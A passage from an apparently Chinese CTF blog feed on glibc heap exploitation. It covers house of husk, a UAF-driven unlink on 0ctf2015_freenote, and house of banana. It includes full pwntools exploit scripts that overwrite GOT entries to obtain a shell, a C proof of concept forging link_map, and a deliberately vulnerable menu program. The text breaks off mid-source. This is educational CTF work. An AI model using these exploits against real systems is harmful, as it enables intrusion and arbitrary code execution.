<p>满足上面的部分就可以成功在 <code>*__printf_arginfo_table[spec-&gt;info.spec]</code> 这个位置来劫持执行流，我们将此处控制为 <code>__stack_chk_fail()</code> ，该函数执行时，会打印出 <code>__libc_argv[0]</code> 指向的字符串</p>
<p>先确定 <code>__libc_argv[0]</code> 的地址（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141310775.png" alt="image-20230214131007737"></p>
<p>然后需要向这个地址里写入一个指向 <code>flag</code> 地址的指针。</p>
<p>我布置的情况如下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141311225.png" alt="image-20230214131134190"></p>
<p>上述布局全部完成，执行 <code>printf((__int64)&quot;Hi, %s. Bye.\n&quot;, name);</code> 时就可以将 <code>flag</code> 打印出来</p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><p><a href="https://zikh26.github.io/posts/ad411136.html">tools源码</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p=load(<span class="string">&#x27;readme_revenge&#x27;</span>)</span><br><span class="line">debug(p,<span class="number">0x45ad0f</span>)</span><br><span class="line">leak_flag=<span class="number">0x4359B0</span></span><br><span class="line">flag_addr=<span class="number">0x6B4040</span></span><br><span class="line">payload=p64(flag_addr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x598</span></span><br><span class="line">payload+=p64(<span class="number">0x6B73E0</span>)<span class="comment">#__libc_argv[0]</span></span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x640</span>-<span class="number">0x5a0</span>)</span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)<span class="comment">#__printf_function_table</span></span><br><span class="line">payload+=p64(<span class="number">0x0</span>)<span class="comment">#__printf_modifier_table</span></span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span></span><br><span class="line">payload+=p64(<span class="number">0x6b7aa8</span>)<span class="comment">#__printf_arginfo_table</span></span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)*<span class="number">0x72</span></span><br><span class="line">payload+=p64(leak_flag)<span class="comment">#__stack_chk_fail</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141317933.png" alt="image-20230214131708408"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>没想到日常使用的 <code>printf</code> 函数也是可以劫持执行流的。但需要注意该手法的利用条件其实有些苛刻，而且没有办法控制参数，只能劫持到 <code>one_gadget</code> 或者不需要参数的地址。所以除了少部分的题目外，该手法并不是一个最优的选择，但通过 <code>house of husk</code> 也让我了解到了 <code>printf</code> 函数中对于自定义格式化字符的处理流程以及可劫持执行流的位置，正所谓技多不压身，<code>house of husk</code> 确实是一个有趣的攻击思路</p>
]]></content>
      <categories>
        <category>学习总结</category>
      </categories>
      <tags>
        <tag>house of husk</tag>
      </tags>
  </entry>
  <entry>
    <title>从一道题来体会用UAF打unlink</title>
    <url>/posts/b3614254.html</url>
    <content><![CDATA[<p>之前对于 <code>unlink</code> 的理解停留在表面，一直以为得有个堆溢出才能利用。今天做了一道 <code>0ctf2015_freenote</code> ，发现利用 <code>UAF</code> ，依然可以打 <code>unlink</code> … 本来记录一下用 <code>UAF</code> 打 <code>unlink</code> 的思路，关于堆溢出打 <code>unlink</code> 以及该手法的更多细节请见 <a href="https://zikh26.github.io/posts/afa5cfa3.html?highlight=unlink">本文</a></p>
<span id="more"></span>



<h3 id="UAF-导致的-unlink"><a href="#UAF-导致的-unlink" class="headerlink" title="UAF 导致的 unlink"></a>UAF 导致的 unlink</h3><p><code>unlink</code> 的关键在于两点</p>
<ol>
<li>去伪造一个 <code>fake_chunk</code> ，并且要已知 <code>&amp;fake_chunk</code> 的地址</li>
<li>能够控制 <code>fake_chunk</code> 下面的（高地址方向）合法堆块的 <code>prev_size</code> 和 <code>size</code></li>
</ol>
<p>上面提到的合法堆块，也被称为引线堆块。当释放掉引线堆块时，因为引线堆块的 <code>prev_inuse</code> 为 <code>0</code> （需要想办法控制），就会让 <code>ptmalloc</code> 以为引线堆块上面还有一个堆块是处于释放状态，然后要触发合并，通过精心构造的引线堆块 <code>prev_size</code> 找到上一个（低地址方向） <code>fake_chunk</code> ，最终触发 <code>unlink</code></p>
<p>如果是堆溢出的话，那么很自然 <code>fake_chunk</code> 的构造以及通过溢出来控制引线堆块的 <code>prev_size</code> 和 <code>size</code> 位都轻而易举。下面来看一下只有 <code>UAF</code> 漏洞，如何来做到同样的效果。</p>
<p>前提：<strong>存在 <code>UAF</code> 漏洞，以 <code>libc 2.23</code> 为例</strong> </p>
<ol>
<li>申请 <code>size</code> 为 <code>0x100</code> 堆块 <code>A</code> 和堆块 <code>B</code> （如下图）</li>
</ol>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307021539178.png" alt="image-20230702153901003" style="zoom:67%;" />

<ol start="2">
<li>现在释放掉 <code>A</code> 和 <code>B</code> ，二者会合并成一个 <code>0x220</code> 的堆块，处于释放状态</li>
</ol>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307021541652.png" alt="image-20230702154135600" style="zoom:50%;" />



<ol start="3">
<li><p>将这个 <code>0x220</code> 处于释放状态的堆块申请出来，命名为堆块 <code>C</code> （如下），此时将堆块申请出来后，是可以往里面写入数据的，此时来在原本堆块 <code>A</code> 的位置伪造 <code>fake_chunk</code> ，然后让写入的数据来覆盖掉堆块 <code>B</code> 的 <code>prev_size</code> 和 <code>size</code></p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307021545118.png" alt="image-20230702154558066" style="zoom:67%;" />
</li>
<li><p>因为存在 <code>UAF</code> 的原因，所以堆块 <code>B</code> 是可以再次被释放的，而它也就被当做了引线堆块。</p>
</li>
</ol>
<p>说到底，其实 <code>UAF</code> 能导致 <code>unlink</code> 的原因实际上是 <code>double free</code> （是位于 <code>unsorted bin</code> 中的堆块两次释放）  至此前戏完成，后面的伪造 <code>fake_chunk</code> 以及触发 <code>unlink</code> 的操作正常进行即可。下面来结合一道题目具体分析一下</p>
<h3 id="0ctf2015-freenote"><a href="#0ctf2015-freenote" class="headerlink" title="0ctf2015_freenote"></a>0ctf2015_freenote</h3><h4 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略"></a>保护策略</h4><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307021555241.png" alt="image-20230702155513169" style="zoom: 67%;" />



<h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307021557055.png" alt="image-20230702155748014" style="zoom:67%;" />

<p>经典菜单堆，增，删，编辑，打印功能都有。<code>delete</code> 函数中存在 <code>UAF</code> 漏洞</p>
<p>在 <code>add</code> 功能中，对申请堆块的大小做了要求，必须要为 <code>0x80</code> 字节对齐（下图红框中体现了这一点），这就意味着申请的堆块都无法进入到 <code>fastbin</code> 中</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307021559740.png" alt="image-20230702155952680" style="zoom:67%;" />

<p><code>edit</code> 功能中首先限制了堆块自定义的标志位是否为 <code>1</code> ，如果不为1的话，说明该堆块已经被释放了（虽然存在 <code>UAF</code> ，但是自定义标志位确实置空了），如果编辑的 <code>size</code> 不等于原本的值，那么会调用 <code>realloc</code> 扩展或缩小堆块</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307021601478.png" alt="image-20230702160146429"></p>
<p><code>show</code> 函数可以一次直接打印所有堆块里面的数据</p>
<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>总结一下前面的已知信息</p>
<ol>
<li>申请堆块最小为 <code>0x90</code>，也就是堆块无法进入 <code>fastbin</code></li>
<li>有 <code>UAF</code> ，但是会将自定义标志位置零</li>
<li><code>show</code> 函数和 <code>edit</code> 函数会检查自定义标志位，但是 <code>delete</code> 函数不会</li>
<li>可以篡改 <code>got</code> 表，并且没开 <code>PIE</code></li>
<li>堆块的地址是记录在了初始大堆块中</li>
</ol>
<p>所以本题的思路是用 <code>show</code> 函数先泄露出 <code>libc</code> 地址和堆地址（因为检查了自定义标志位，所以要将堆块申请出来，利用里面的残留值进行打印），按照本文最开始说的来布局，利用 <code>uaf</code> 做出 <code>unlink</code> </p>
<p>图解过程如下：</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307021624541.png" alt="image-20230702162401437"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307021627938.png" alt="image-20230702162714882"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307021625822.png" alt="image-20230702162431475"></p>
<p>释放引线堆块，触发 <code>unlink</code> ，在记录堆块地址的位置写入了一个 <code>&amp;fake_chunk</code> 的地址</p>
<p>然后再记录堆块地址的区域写一个 <code>atoi</code> 函数的 <code>got</code> 表地址，最后用 <code>edit</code> 功能篡改 <code>atoi</code> 的 <code>got</code> 表为 <code>system</code> 地址，执行到 <code>atoi(&quot;/bin/sh&quot;)</code> 获取 <code>shell</code></p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">d_a=<span class="number">0x4010D4</span></span><br><span class="line">d_d=<span class="number">0x4010EC</span></span><br><span class="line">d_e=<span class="number">0x4010e0</span></span><br><span class="line">d_s=<span class="number">0x4010C8</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;pwn&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26132&quot;</span>,<span class="string">&quot;buu64-libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Length of new note: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Enter your note: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Note number: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Length of note: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Enter your note: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Note number: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;heap_addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;q&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;x&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;x&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">libc_base=recv_libc()-<span class="number">0x3c4c78</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;r&#x27;</span>*<span class="number">0x100</span>)<span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x100</span>)<span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;prevent1&#x27;</span>)<span class="comment">#8</span></span><br><span class="line">debug(p,d_d,d_a,d_e,d_s,<span class="number">0x400F67</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target_addr=heap_addr-<span class="number">0x1980</span></span><br><span class="line">fake=p64(<span class="number">0</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line">fake+=p64(target_addr-<span class="number">0x18</span>)+p64(target_addr-<span class="number">0x10</span>)</span><br><span class="line">fake+=p64(<span class="number">0</span>)*<span class="number">28</span></span><br><span class="line">fake+=p64(<span class="number">0x100</span>)+p64(<span class="number">0x110</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x200</span>,fake.ljust(<span class="number">0x200</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,<span class="number">0x200</span>,p64(e.got[<span class="string">&#x27;atoi&#x27;</span>])*<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x10</span>,p64(sys_addr)*<span class="number">2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307021635207.png" alt="image-20230702163540908"></p>
]]></content>
      <categories>
        <category>学习总结</category>
      </categories>
      <tags>
        <tag>篡改got表</tag>
        <tag>UAF</tag>
        <tag>unlink</tag>
      </tags>
  </entry>
  <entry>
    <title>关于house of banana的学习总结</title>
    <url>/posts/efb4678.html</url>
    <content><![CDATA[<h2 id="house-of-banana"><a href="#house-of-banana" class="headerlink" title="house of banana"></a>house of banana</h2><blockquote>
<p>攻击效果：</p>
<p>控制程序的执行流</p>
<p>适用版本：<code>glibc2.23</code> 到目前最新的 <code>2.36</code></p>
<p>注意： 使用 <code>setcontext</code> 来控制寄存器打 <code>orw</code> 的话，需要在 <code>2.29</code> 版本以上才行（ <code>2.27</code> 没有办法让 <code>rdx</code> 或 <code>rdi</code> 为堆地址）</p>
<p>利用条件：</p>
<ol>
<li>可以任意地址写一个堆地址（通常使用 <code>large bin attack</code>）</li>
<li>能够从 <code>main</code> 函数返回或者调用 <code>exit</code> 函数</li>
<li>可以泄露 <code>libc</code> 地址和堆地址</li>
</ol>
</blockquote>
<span id="more"></span>

<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p><code>link_map</code> 结构体的存储方式和堆块链表类似，是通过 <code>l_next</code> 和 <code>l_prev</code> 指针来连接的,而这个链表的头指针就是 <code>_rtld_global</code> 结构体中的 <code>_ns_loaded</code> 所存储的地址。</p>
<p> 如果我们可以通过 <code>large bin attack</code> 或其他方式将链表的头指针改为可控堆地址，这样就可以伪造第一个 <code>link_map</code> 结构体，从而控制结构体中的各个字段，下面代码是 <code>_dl_fini</code> 函数中的片段</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172126686.png" alt="image-20230217212607337" style="zoom:50%;" />

<p>蓝色框中是要绕过 <code>if</code> 检查所需要伪造的字段，红色框中是劫持执行流的位置。</p>
<p>最终的目的是需要伪造一些字段绕过检查并布局一些字段为劫持执行流做准备，最终执行到 <code>array[i]</code> 时进行劫持。</p>
<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>首先需要恢复<code>l_next</code> 字段原本的值，这样之后的 <code>link_map</code> 就不用再伪造了。</p>
<p>将 <code>l_real</code> 字段改为伪造的 <code>link_map</code> 地址，以便满足 <code>if (l == l-&gt;l_real)</code> ，确保不会触发 <code>assert</code></p>
<p>将 <code>l_info[26]</code> 的值设置为非空，为了满足 <code>if (l-&gt;l_info[DT_FINI_ARRAY] != NULL)</code></p>
<p>如果满足这三个条件，那么就可以对 <code>array</code> 的地址进行设置，如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ElfW(Addr) *<span class="built_in">array</span> = (ElfW(Addr) *) (l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br></pre></td></tr></table></figure>

<p>为了更精准的控制 <code>array</code> ，我们控制 <code>l_addr</code> 为 <code>0</code> （事实上这个值通常也没有办法被控制，因为这个 <code>l_addr</code> 是堆块的 <code>prev_size</code>  字段，正常情况就是 <code>0</code>）</p>
<p>而 <code>DT_FINI_ARRAY</code> 这个宏就是 <code>26</code> ，<code>d_un</code> 则是一个联合体，定义如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    Elf32_Word d_val;			<span class="comment">/* Integer value */</span></span><br><span class="line">    Elf32_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">  &#125; d_un;</span><br></pre></td></tr></table></figure>

<p>如果我们将 <code>l-&gt;l_info[26]</code> 的值设置为 <code>l-&gt;l_info[26]</code> 的地址，那么 <code>l-&gt;l_info[27]</code> 中的值则是 <code>array</code> </p>
<p><strong>注意：</strong>  <code>-&gt;</code> 操作符在 <code>C</code> 语言被定义为结构体指针成员的解引用和成员访问操作符，也就是说该操作符完成了两个操作，先对指针进行了解引用，然后再访问指针所指向的结构体成员。因此上面的代码 <code>l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr</code> 进行了两次解引用最后将值赋给 <code>array</code> ，而 <strong>winmt</strong> 师傅在 <a href="https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_31">文章</a> 中写到 <strong>“以及l-&gt;l_info[26]-&gt;d_un.d_ptr，也就是l-&gt;l_info[27]”</strong> ，这句话有点小问题，因为理解为 <code>l-&gt;l_info[27]</code> 的话，只进行了一次解引用，所以这里替 <strong>winmt</strong> 师傅纠正下 QAQ</p>
<p>接下来控制 <code>i</code> 的值，代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br></pre></td></tr></table></figure>

<p><code>DT_FINI_ARRAYSZ</code> 这个宏是 <code>28</code> ，所以将 <code>l-&gt;l_info[28]</code> 的值设置为 <code>l-&gt;l_info[28]</code> 的地址，那么 <code>l-&gt;l_info[29]</code> 中的值再除 <code>8</code> ，则是最后的 <code>i</code></p>
<p>最后的劫持位置是函数指针 <code>array[i]</code> 被调用，如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">((<span class="type">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br></pre></td></tr></table></figure>

<p>上面已经提到了 <code>array</code> 和 <code>i</code> 都可以被控制，因此这里可以执行代码，如果打 <code>one_gadget</code> 获取 <code>shell</code> 的话，直接布置地址即可，但是执行 <code>orw</code> 的话，需要先空走一轮函数调用，因为 <code>rdx</code> 再每轮循环后，都会被更新为堆地址（如下图）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172126762.png" alt="image-20230217203244752" style="zoom:50%;" />



<p>走空一轮的意思就是跳转到 <code>ret</code> 指令上，然后立刻退出这一轮的函数指针调用，<code>i--</code> 然后调用下一个 <code>array[i]</code> 中存放的函数指针，此时的 <code>rdx</code> 已经为堆地址了，所以此时去跳转到 <code>setcontext+61</code>  的位置，布置 <code>SROP</code> ，调用 <code>read</code> 函数再次读入 <code>orw</code> 的 <code>rop</code> 链使其正好落到 <code>read</code> 函数的返回地址上，从而绕过沙箱保护。</p>
<p><strong>补充：</strong></p>
<p><code>2.27</code> 的 <code>libc</code> 中没办法控制寄存器走 <code>setcontext</code> ，因为其汇编如下</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172129364.png" alt="image-20230217212955875" style="zoom:50%;" />

<p>对比下面这个图片（ <code>2.31</code> 的 <code>libc</code>），就会发现 <code>2.27</code> 没有 <code>rdi</code> 或者 <code>rdx</code> 被赋值为堆地址的指令,所以不好打 <code>orw</code></p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172131373.png" alt="image-20230217213154837" style="zoom: 50%;" />





<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc poc.c -o poc -w -g</span></span><br><span class="line"><span class="comment">//ubuntu 18.04     GLIBC 2.27-3ubuntu1.6</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rtld_global_dl_ns 0x61b060</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> one_gadget 0x4f302</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  </span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> libc_base=&amp;<span class="built_in">printf</span><span class="number">-0x64e40</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;libc base %llx\n&quot;</span>,libc_base);</span><br><span class="line">  <span class="type">size_t</span> *p=<span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">  </span><br><span class="line">  p[<span class="number">3</span>]=libc_base+<span class="number">0x61c710</span>;<span class="comment">//l_next</span></span><br><span class="line">  p[<span class="number">5</span>]=p;<span class="comment">//l_real    也是伪造的link_map地址</span></span><br><span class="line">  p[<span class="number">34</span>]=&amp;p[<span class="number">34</span>];<span class="comment">//l-&gt;l_info[26] DT_FINI_ARRAY</span></span><br><span class="line">  p[<span class="number">35</span>]=&amp;p[<span class="number">38</span>];<span class="comment">//l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr    </span></span><br><span class="line">  p[<span class="number">36</span>]=&amp;p[<span class="number">36</span>];<span class="comment">//l-&gt;l_info[DT_FINI_ARRAYSZ]</span></span><br><span class="line">  p[<span class="number">37</span>]=<span class="number">0x8</span>;<span class="comment">//i=l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span></span><br><span class="line">  p[<span class="number">38</span>]=libc_base+one_gadget;<span class="comment">//call array[i]</span></span><br><span class="line">  p[<span class="number">0x62</span>]=<span class="number">0x800000000</span>;<span class="comment">//使l-&gt;l_init_called 为1</span></span><br><span class="line">  *(<span class="type">size_t</span> *)(rtld_global_dl_ns+libc_base)=p;<span class="comment">//劫持_rtld_global_ns_loaded  目的伪造link_map</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172153387.png" alt="image-20230217215313299" style="zoom: 67%;" />



<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>自己写了一个程序，打了一下 <code>house of banana</code> ，我先是编译完之后，对应的是 <code>libc2.27</code> ，我用 <code>house of banana</code> 劫持执行流后打的 <code>og</code> 获取了 <code>shell</code> ，然后又 <code>patch</code> 成了 <code>2.31-0ubuntu9_amd64</code> 打的 <code>orw</code> </p>
<p><code>C</code> 源码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc test.c -o test -w -g</span></span><br><span class="line"><span class="comment">//ubuntu 18.04     GLIBC 2.27-3ubuntu1.6</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> num 10</span></span><br><span class="line"><span class="type">void</span> *chunk_list[num];</span><br><span class="line"><span class="type">int</span> chunk_size[num];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">	setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;1.add&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;2.show&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;3.edit&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;4.delete&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;5.exit&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Your choice:&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> index,size;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line">	<span class="keyword">if</span>(index&lt;<span class="number">0</span> || index&gt;=num)</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;size);</span><br><span class="line">	<span class="keyword">if</span>(size&lt;<span class="number">0x80</span>||size&gt;<span class="number">0x500</span>)</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	chunk_list[index] = <span class="built_in">calloc</span>(size,<span class="number">1</span>);</span><br><span class="line">  chunk_size[index] = size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> index;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line">	<span class="keyword">if</span>(index&lt;<span class="number">0</span> || index&gt;=num)</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;context: 